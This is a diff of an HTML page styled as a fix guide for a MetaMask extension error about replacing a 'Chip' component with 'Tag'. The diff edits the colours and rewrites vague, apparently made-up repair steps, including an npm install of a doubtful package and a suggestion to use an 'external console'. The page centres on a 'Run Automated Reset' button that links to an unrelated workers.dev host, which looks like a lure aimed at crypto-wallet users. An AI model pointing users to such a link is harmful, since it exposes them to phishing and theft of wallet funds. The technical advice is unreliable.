@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Metamask Extension Replace Deprecated Chip Component With Tag F</title>
 <style>
     body {
-        font-family: system-ui;
-        background: #121214;
+        font-family: -apple-system;
+        background: #1a1a24;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -23,7 +23,7 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #cf6679; }
+    a { color: #00adb5; }
     .btn {
         background: #ff7b2c;
         color: #000;
@@ -45,29 +45,24 @@
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs because the Chip component is no longer supported in the current version of the component-library, and the Metamask extension is still using it, resulting in a compatibility issue.</li>
+<li>The error occurs because the Chip component is no longer supported in the latest version of the component-library, and the Metamask extension is still using the outdated component.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Update the component-library to the latest version to ensure compatibility with the Metamask extension.</li>
-<li>Replace all instances of the Chip component with the Tag component in the extension's code.</li>
-<li>Configure the extension's settings to use the new Tag component:</li>
+<li>Update the component imports to use the new Tag component: </li>
+<li>Replace <code>import { Chip } from '@material-ui/core';</code> with <code>import { Tag } from '@component-library/tag';</code></li>
+<li>Update the component usage to match the new Tag component API</li>
+<li>Verify that the new component is properly styled and functional</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;components&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="nt">&quot;chip&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
-<span class="w">      </span><span class="nt">&quot;replacement&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Tag&quot;</span>
-<span class="w">    </span><span class="p">}</span>
-<span class="w">  </span><span class="p">}</span>
-<span class="p">}</span>
+<div class="codehilite"><pre><span></span><code>npm<span class="w"> </span>install<span class="w"> </span>@component-library/tag
 </code></pre></div>
 
-<p>Consider utilizing an external console for further debugging and customization. </p>
+<p>Consider using an external console to verify the changes, for a more detailed output use a terminal. </p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Metamask extension installed and configured</li>
-<li>Component-library updated to the latest version</li>
-<li>Basic understanding of JSON configuration files</li>
+<li>Node.js and npm installed on the system</li>
+<li>The @component-library/tag package is compatible with the current project version</li>
+<li>The Metamask extension is properly configured and connected to the Ethereum network</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
